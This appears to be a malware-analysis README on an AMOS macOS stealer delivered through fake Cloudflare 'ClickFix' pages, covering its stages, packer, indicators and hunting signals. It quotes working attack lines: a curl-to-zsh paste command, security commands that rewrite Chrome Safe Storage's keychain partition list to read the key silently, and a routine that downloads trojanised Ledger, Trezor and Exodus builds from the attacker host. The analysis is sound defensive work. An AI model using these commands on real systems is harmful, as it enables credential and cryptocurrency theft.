# AMOS ClickFix: recovering a run-only AppleScript from a packed Mach-O

Analysis of an AMOS (Atomic macOS Stealer) delivery chain distributed through ClickFix, in which
the final payload is a **run-only AppleScript encrypted inside a packed Mach-O**, rather than the
plaintext AppleScript that published analyses of this family describe.

This repository contains the recovered sources, indicators and a YARA rule. It does not contain
binaries; the samples are on MalwareBazaar.

## Why this chain is worth documenting

Published AMOS and AMOS-adjacent research describes chains that stop at a readable AppleScript.
This one adds two stages and a keychain technique that, as far as I can find, are not documented
together anywhere:

| | Published analyses | This chain |
|---|---|---|
| Final payload | plaintext AppleScript | **run-only**, recovered by decompilation |
| Binary stage | none, or unpacked Rust Mach-O | **packed Mach-O**, universal x86_64 + arm64 |
| Stage encryption | XOR, single or multi-key | AES-128-CTR, then **ChaCha20-Poly1305** in 7 authenticated chunks |
| Chrome Safe Storage | read the key, or overwrite it | **rewrite the ACL partition list** to read the existing key without prompting |
| Wallet apps | Ledger and Trezor replaced | Ledger, Trezor **and Exodus** |

## The chain

```
fake Cloudflare verification page
  └─ curl -fsSL <gate> | zsh
      └─ stage 1  delivery gate, single-use token
          └─ stage 2  zsh loader, AES-128-CTR
              └─ stage 3  dropper, writes /tmp/.algjq, xattr -c, chmod +x
                  └─ stage 4  packed Mach-O, ChaCha20-Poly1305, 7 chunks
                      └─ stage 5  run-only AppleScript, executed in memory
```

### Stage 4, the packer

Universal Mach-O, x86_64 and arm64, ad-hoc signed with no Team ID and a signing identifier of
the form `setup-<40 hex>`. Build hashes rotate roughly hourly.

The embedded payload is encrypted with ChaCha20-Poly1305 across seven independently
authenticated chunks, behind an **88,529-iteration key stretch**. The `__text` section is hashed
at runtime and the digest feeds key derivation, so patching any instruction produces the wrong
key rather than a branch that can be flipped. The payload is decrypted to memory and executed
through OSAKit; it is never written to disk.

### Stage 5, the run-only AppleScript

`osadecompile` refuses run-only scripts with `errOSASourceNotAvailable (-1756)`. The source in
`decompiled/stage5.applescript` was recovered with
[pberba/applescript-decompiler](https://github.com/pberba/applescript-decompiler), validated
first against a locally compiled run-only script of known content. Identifiers are the
operator's own obfuscated names.

The `on run` handler establishes the order of operations:

```applescript
tell Terminal to set (visible of windows 1) to false      -- hide the window first
set ndnmkrdayb to (do shell script "sw_vers ...")          -- macOS >= 26.4.1 ?

beacon("boot","started")
messengers → credentials → browsers → wallets → passmgr    -- collection, then upload
set pwd to kjmumgzxpx(...)                                 -- password prompt, unconditional
if ndnmkrdayb is "1" then vpropadaalz(staging, home, pwd)  -- keychain ACL shim
resolve_auth → local_data → upload → persistence
```

Two things fall out of this. Collection happens **before** the password is requested, so
file-level theft does not depend on any user interaction. And the prompt itself is
unconditional: no macOS version reaches the later stages without it.

### The keychain ACL rewrite

On macOS 26.4.1 and later, partition-list enforcement tightened and
`security find-generic-password -w` no longer returns the value non-interactively. The malware
rewrites the ACL instead of working around it:

```
security unlock-keychain -p <password> ~/Library/Keychains/login.keychain-db
security set-generic-password-partition-list \
    -S 'apple:,teamid:EQHXZ8M8AV' -a 'Chrome' -s 'Chrome Safe Storage' -k <password>
security find-generic-password -w -s 'Chrome Safe Storage'
```

`EQHXZ8M8AV` is Google's Team ID. Adding it to the partition list makes the read look like
Chrome's own, so no prompt appears and the existing key keeps working. Other families sharing
this Team ID **overwrite** the key with one they know, which breaks Chrome's stored data and is
noisier; reading the real key leaves everything intact.

### Wallet application replacement

Three handlers replace wallet applications with builds fetched from the exfiltration host. This
is the most damaging capability in the payload, and it outlives the data theft: what remains is
an ordinary application in `/Applications`.

```applescript
set app to "/Applications/Ledger Wallet.app"
(list folder POSIX file app)                       -- only if already installed
write "user100" to home & "/.logged"
curl -fsSL -o <tmp>.zip https://<host>/zxc/app.zip
if first two bytes are not "PK" then return        -- verify it is a real archive
if size < <floor> then return
pkill "Ledger Wallet"
rm -rf "/Applications/Ledger Wallet.app"
  -- on failure: echo <password> | sudo -S rm -r "/Applications/Ledger Wallet.app"
ditto -x -k <tmp>.zip /Applications
chmod -R +x "/Applications/Ledger Wallet.app"
```

| Target | Archive |
|---|---|
| `/Applications/Ledger Wallet.app` | `/zxc/app.zip` |
| `/Applications/Trezor Suite.app` | `/zxc/apptwo.zip` |
| `/Applications/Exodus.app` | `/zxc/appex.zip` |

Exodus is a software wallet, so a replaced build can read the seed from the machine directly
rather than having to intercept a hardware device. The `rm -rf` escalates with the phished
password, making this a second consumer of that credential.

The replacement archives were not retrieved.

## Infrastructure overlap with MacSync

`loop-lumen[.]com` and `jadeleap15[.]com` were already present in ThreatFox, classified as
**MacSync** and reported by a third party before these samples were analysed. The two families
share exfiltration infrastructure, along with a fake Cloudflare lure, the
`curl -kfsSL $(echo … | base64 -D) | zsh` paste pattern, `ditto -c -k --sequesterRsrc` for
packaging, `dscl . authonly` for password validation, and the same wallet and browser target
lists. The chain documented here looks like a later iteration of the same operation: the
plaintext AppleScript fetched from a C2 has become a run-only script encrypted inside a packed
binary.

## Contents

```
decompiled/stage1.sh              stage 1 one-liner, decoded
decompiled/stage2.zsh             loader, decrypted
decompiled/stage3.zsh             dropper, decrypted
decompiled/stage5.applescript              final payload, decompiled from run-only
decompiled/stage5_deobfuscated.applescript same script, identifiers renamed for readability
iocs/network.txt                  domains, IPs, URLs
iocs/host.txt                     paths, LaunchDaemons, keychain
iocs/samples.txt                  hashes and code signing
amos-clickfix.yar                 detection rule for the packed Mach-O
```

## Samples

| Stage | SHA-256 | Links |
|---|---|---|
| 4, build A | `4903c40fbdb96cf39f35ed592a886a39d230564b26dd80aef3fa6c58bc501551` | [MB](https://bazaar.abuse.ch/sample/4903c40fbdb96cf39f35ed592a886a39d230564b26dd80aef3fa6c58bc501551/) · [VT](https://www.virustotal.com/gui/file/4903c40fbdb96cf39f35ed592a886a39d230564b26dd80aef3fa6c58bc501551) |
| 4, build B | `b95ea805469383b5a419c5043de45bb2b13f36b3a513f98bd608b3f7294f064f` | [MB](https://bazaar.abuse.ch/sample/b95ea805469383b5a419c5043de45bb2b13f36b3a513f98bd608b3f7294f064f/) · [VT](https://www.virustotal.com/gui/file/b95ea805469383b5a419c5043de45bb2b13f36b3a513f98bd608b3f7294f064f) |
| 2 | `970d309161a68d460b7183f2912b459fd1206229794b28d818e0b82f4fd22f3d` | [MB](https://bazaar.abuse.ch/sample/970d309161a68d460b7183f2912b459fd1206229794b28d818e0b82f4fd22f3d/) · [VT](https://www.virustotal.com/gui/file/970d309161a68d460b7183f2912b459fd1206229794b28d818e0b82f4fd22f3d) |
| 5 | `8f12396cfb1ac4d52b3c0fad997b2cf83839bc464cfa43e43959239a3016d287` | [MB](https://bazaar.abuse.ch/sample/8f12396cfb1ac4d52b3c0fad997b2cf83839bc464cfa43e43959239a3016d287/) · [VT](https://www.virustotal.com/gui/file/8f12396cfb1ac4d52b3c0fad997b2cf83839bc464cfa43e43959239a3016d287) |

Detection at the time of writing was 12/75 on the packed binary and 6/75 on the AppleScript.
Kaspersky and Microsoft label the binary as AMOS; Avast and AVG report generic heuristic names.

## Hunting

Behavioural signals, in rough order of how specific they are:

- `security set-generic-password-partition-list` referencing `Chrome Safe Storage`
- `~/Library/Application Support/.com.apple.accountsd/.auth` existing at all
- A LaunchDaemon named `com.apple.metadata.mds.worker` or `com.apple.accountsd.helper`
- A hidden directory under `/Library/Application Support/` starting `.com.apple.`
- `ditto -x -k` writing into `/Applications` from a path under `/tmp`
- `osascript` executing a file under `/tmp`
- `sw_vers` followed within seconds by `security unlock-keychain`

## References

- [pberba/applescript-decompiler](https://github.com/pberba/applescript-decompiler)
- [Trend Micro, AMOS via cracked apps](https://www.trendmicro.com/en_us/research/25/i/an-mdr-analysis-of-the-amos-stealer-campaign.html)
- [Jamf, AmnesiaStealer](https://www.jamf.com/blog/amnesia-stealer-macos-infostealer-clickfix/)
- [Group-IB, ClickLock Stealer](https://www.group-ib.com/blog/clicklock-stealer-macos-malware/)

## Licence

Public domain. Use the indicators and the rule however you like.
